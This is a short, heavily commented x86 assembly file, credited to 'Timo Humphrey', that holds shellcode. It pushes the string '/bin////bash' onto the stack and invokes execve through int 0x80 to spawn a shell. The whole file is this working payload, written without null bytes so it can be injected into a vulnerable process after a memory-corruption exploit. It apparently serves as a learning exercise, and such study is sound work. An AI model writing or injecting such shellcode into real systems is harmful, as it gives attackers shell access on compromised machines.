; File: execve-stack-binbash.nasm
; Author: Timo Humphrey
; 
; Description: This is shellcode to run /bin/bash via execve.

; execve(const char *filename, char *const argv[], char *const envp[]);
; execve(/bin/bash,/bin/bash,NULLs)
;
; execve (filename,     argv[],                  envp[] )
; EAX=11; EBX=Filename; ECX=Pointer to Filename; EDX=Null

global _start

section .text
_start:
	xor eax, eax		; Zero out EAX
	push eax		; PUSH EAX (0x0) onto the stack (terminates string)
	
	push 0x68736162		; PUSH onto Stack: hsab
	push 0x2f2f2f2f		; PUSH onto Stack: ////		/bin////bash
	push 0x6e69622f		; PUSH onto Stack: nib/
	mov ebx, esp		; MOV Stack Pointer (ESP) to EBX (Address of /bin////bash as first ARG filename)
	
	push eax		; PUSH EAX (0x0) onto the stack
	mov edx, esp		; MOV Stack Pointer (ESP) to EDX (point to null)
	
	push ebx		; PUSH EBX (Pointer to /bin////bash shellcode) onto the Stack
	mov ecx, esp		; MOV new Stack Pointer into ECX
	
	mov al, 0xb		; MOV sysCall 11 (execve) into AL
	int 0x80		; INTerrupt kernel to execute execve.
